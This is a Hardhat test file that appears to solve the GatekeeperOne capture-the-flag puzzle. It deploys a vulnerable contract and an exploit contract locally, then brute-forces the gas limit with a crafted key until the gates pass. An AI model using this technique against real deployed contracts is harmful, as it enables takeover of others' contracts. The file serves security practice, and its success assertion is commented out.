import {expect} from 'chai';
import hre from 'hardhat';
import { loadFixture } from "@nomicfoundation/hardhat-network-helpers";

describe("Exploit GateKeeperOne", function() {
    async function deployGateKeeper(){

        const Gatekeeper = await hre.ethers.getContractFactory("GatekeeperOne");
        const GatekeeperExploiter = await hre.ethers.getContractFactory("GatekeeperOneExploit")

        const gateKeeper = await Gatekeeper.deploy();
        const gatekeeperAddress = await gateKeeper.address
        const gatekeeperExploiter = await GatekeeperExploiter.deploy(gatekeeperAddress);

        // const instance1 = await gateKeeper.deployed();
        // const instance2 = await gatekeeperExploiter.deployed();

        return {gateKeeper, gatekeeperExploiter}
    }

    xit("Should have the address of the owner set to the creator", async () => {
        const {gateKeeper, gatekeeperExploiter} = await loadFixture(deployGateKeeper);
        const [owner] = await hre.ethers.getSigners();
        expect(await gatekeeperExploiter.ownerAddress()).to.equal(owner.address)
    })

    xit("Should have set the victim address to the exploit contract", async () => {
        const {gateKeeper, gatekeeperExploiter} = await loadFixture(deployGateKeeper);
        const gateKeeperAddress = gateKeeper.address;
        const victimAddress = await gatekeeperExploiter.victim();
        expect(victimAddress).to.equal(gateKeeperAddress);
    })
    
    it("Should be able to exploit the gateKeeperOne contract", async () => {
        const {gateKeeper, gatekeeperExploiter} = await loadFixture(deployGateKeeper);

        let gasCost = 2997288;
        while(true){
            try{
                // const isEntered = await gatekeeperExploiter.functions.exploit("0x1000000000002daa", {gasLimit: gasCost});
                const isEntered = await gatekeeperExploiter.functions.exploit("0x1000000000002266", {gasLimit: gasCost});
                break;
            }catch{
                gasCost -= 1;
                console.log(gasCost);
            }
        }
        // expect(isEntered).to.equal(true);
    })
})